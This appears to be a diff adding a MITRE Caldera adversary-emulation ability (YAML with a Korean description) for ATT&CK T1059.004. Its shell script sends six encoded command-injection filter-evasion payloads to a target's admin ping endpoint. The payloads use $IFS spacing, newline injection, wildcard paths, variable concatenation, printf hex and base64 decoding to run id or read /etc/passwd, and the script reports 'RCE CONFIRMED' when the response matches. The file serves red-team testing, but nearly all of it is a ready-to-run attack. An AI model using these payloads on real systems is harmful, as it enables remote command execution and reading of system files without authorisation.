@@ -1,0 +1,60 @@
+- id: f3c4d5e6-f7a8-b9c0-d1e2-f3a4b5c6d7e8
+  name: Command Injection Filter Evasion
+  description: 기본 명령 삽입 필터를 우회하기 위한 고급 기법을 테스트합니다. $IFS(내부 필드 구분자)로 공백 우회, 16진수/8진수 인코딩, 와일드카드 명령 호출, 변수 치환 등 다양한 우회 벡터를 사용합니다.
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Unix Shell'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.004"
+          ABILITY_ID="f3c4d5e6-f7a8-b9c0-d1e2-f3a4b5c6d7e8"
+          TARGET="http://#{target.url}"
+
+          EVASION_PAYLOADS=(
+            # 1. $IFS for space bypass: ;cat${IFS}/etc/passwd
+            "127.0.0.1%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd"
+            # 2. Newline injection: %0a id
+            "127.0.0.1%0aid"
+            # 3. Wildcard command: /???/??t /???/p??s?d (= /bin/cat /etc/passwd)
+            "127.0.0.1%3B%2F%3F%3F%3F%2F%3F%3Ft+%2F%3F%3F%3F%2Fp%3F%3Fs%3Fd"
+            # 4. Variable concatenation: a=ca;b=t;$a$b /etc/passwd
+            "127.0.0.1%3Ba%3Dca%3Bb%3Dt%3B%24a%24b+%2Fetc%2Fpasswd"
+            # 5. Hex encoding via printf: $(printf '\x69\x64')  = id
+            "127.0.0.1%3B%24%28printf+%27%5Cx69%5Cx64%27%29"
+            # 6. Base64 decoding: $(echo aWQ=|base64 -d) = id
+            "127.0.0.1%3B%24%28echo+aWQ%3D%7Cbase64+-d%29"
+          )
+
+          LABELS=(
+            "IFS space bypass: ;cat\${IFS}/etc/passwd"
+            "Newline injection: %0a id"
+            "Wildcard command: /???/??t /???/p??s?d"
+            "Variable concat: a=ca;b=t;\$a\$b"
+            "Hex printf: \$(printf '\\x69\\x64')"
+            "Base64 decode: \$(echo aWQ=|base64 -d)"
+          )
+
+          echo "[*] CMDi Filter Evasion — testing advanced bypass techniques"
+          for i in "${!EVASION_PAYLOADS[@]}"; do
+            echo ""
+            echo "[*] Evasion $((i+1)): ${LABELS[$i]}"
+            RESULT=$(curl -s \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/admin/ping?host=${EVASION_PAYLOADS[$i]}")
+            echo "[+] Response:"
+            echo "${RESULT}" | head -10
+
+            if echo "${RESULT}" | grep -qE 'uid=[0-9]+|root:'; then
+              echo "[!] RCE CONFIRMED via evasion technique"
+            fi
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.rce.evasion
